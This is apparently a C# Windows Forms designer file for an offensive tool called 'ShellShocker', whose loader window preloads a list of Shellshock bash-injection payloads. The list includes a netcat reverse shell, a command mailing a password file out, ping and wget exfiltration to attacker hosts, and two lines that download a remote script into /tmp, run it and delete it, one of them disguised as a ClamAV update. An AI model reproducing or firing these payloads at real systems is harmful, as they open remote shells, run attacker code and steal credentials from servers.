namespace ShellShocker
{
    partial class Loader
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.panel1 = new System.Windows.Forms.Panel();
            this.button1 = new System.Windows.Forms.Button();
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.cancel = new System.Windows.Forms.Button();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.cancel);
            this.panel1.Controls.Add(this.button1);
            this.panel1.Controls.Add(this.listBox1);
            this.panel1.Location = new System.Drawing.Point(2, 3);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(757, 270);
            this.panel1.TabIndex = 0;
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(333, 229);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(75, 23);
            this.button1.TabIndex = 1;
            this.button1.Text = "Load";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // listBox1
            // 
            this.listBox1.FormattingEnabled = true;
            this.listBox1.Items.AddRange(new object[] {
            "() { :;}; /bin/bash -c \"nc yourip port -e /bin/sh\"\' ",
            "() { :;} /bin/bash -c \"echo hacked > gersy.txt\"\'",
            "() { :;}; mail -s \"This is hacked pass file \" myemail@mail.net | cat `/.secret/pa" +
                "sswd",
            "() { :; }; /bin/eject\" http://example.com/",
            "() {:;}; ping -c 1 -p cb18cb3f7bca4441a595fcc1e240deb0 attacker-machine.com",
            "() {:;}; /usr/bin/wget http://attacker-controlled.com/ZXhhbXBsZS5jb21TaGVsbFNob2N" +
                "rU2FsdA== >> /dev/null",
            "() { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20",
            "() { :;}; /bin/bash -c \\\"cd /tmp;wget http://213.x.x.x/ji;curl -O /tmp/ji http://" +
                "213.x.x.x/ji ; perl /tmp/ji;rm -rf /tmp/ji\\\"",
            "() { :;}; /bin/bash -c \\\"/usr/bin/env curl -s http://xxxxxxxxxxxxxxx.com/cl.py > " +
                "/tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sl" +
                "eep 5; rm -rf /tmp/clamd_update\\\""});
            this.listBox1.Location = new System.Drawing.Point(11, 10);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(734, 212);
            this.listBox1.TabIndex = 0;
            this.listBox1.SelectedIndexChanged += new System.EventHandler(this.listBox1_SelectedIndexChanged);
            // 
            // cancel
            // 
            this.cancel.Location = new System.Drawing.Point(414, 229);
            this.cancel.Name = "cancel";
            this.cancel.Size = new System.Drawing.Size(75, 23);
            this.cancel.TabIndex = 1;
            this.cancel.Text = "Cancel";
            this.cancel.UseVisualStyleBackColor = true;
            this.cancel.Click += new System.EventHandler(this.cancel_Click);
            // 
            // Loader
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(759, 274);
            this.Controls.Add(this.panel1);
            this.Name = "Loader";
            this.Text = "Loader";
            this.panel1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Button button1;
        public System.Windows.Forms.ListBox listBox1;
        private System.Windows.Forms.Button cancel;
    }
}